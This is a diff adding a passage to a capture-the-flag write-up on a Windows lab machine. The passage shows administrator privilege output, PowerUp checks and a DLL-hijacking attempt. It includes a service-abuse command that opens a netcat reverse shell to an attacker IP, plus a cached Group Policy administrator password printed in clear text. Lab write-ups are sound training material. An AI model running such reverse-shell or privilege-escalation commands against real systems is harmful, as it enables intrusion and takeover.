@@ -485,4 +485,90 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 ```
 
-Now you can take advantage of Potato Exploits.
+Now you can take advantage of Potato Exploits. Looking at `whoami /priv` on Administrator side
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+```
+### `Beyond Root`
+###### `DLL Hijacking`
+One of the results when I ran the `PowerUp.ps1` was that I should be able to Hijack the DLL. Let's explore that area.
+```
+PS C:\temp> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.2\a\nc64.exe -e cmd.exe 10.10.14.2 443"
+Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.2\a\nc64.exe -e cmd.exe 10.10.14.2 443"
+
+ServiceAbused Command                                          
+------------- -------                                          
+UsoSvc        \\10.10.14.2\a\nc64.exe -e cmd.exe 10.10.14.2 443
+
+
+PS C:\temp> Invoke-AllChecks
+Invoke-AllChecks
+
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 3056
+ProcessId   : 3632
+Name        : 3632
+Check       : Process Token Privileges
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services
+
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+IdentityReference : QUERIER\mssql-svc
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+Check             : %PATH% .dll Hijacks
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+Name         : C:\Windows\Panther\Unattend.xml
+Check        : Unattended Install Files
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group 
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+Check     : Cached GPP Files
+```
+
+It’s saying that that I can write to the dll at the location in AppData. The problem is that, I don’t have a way to then restart a service or anything else that will use this dll and is running as administrator or system, so it’s a dead end for this box.
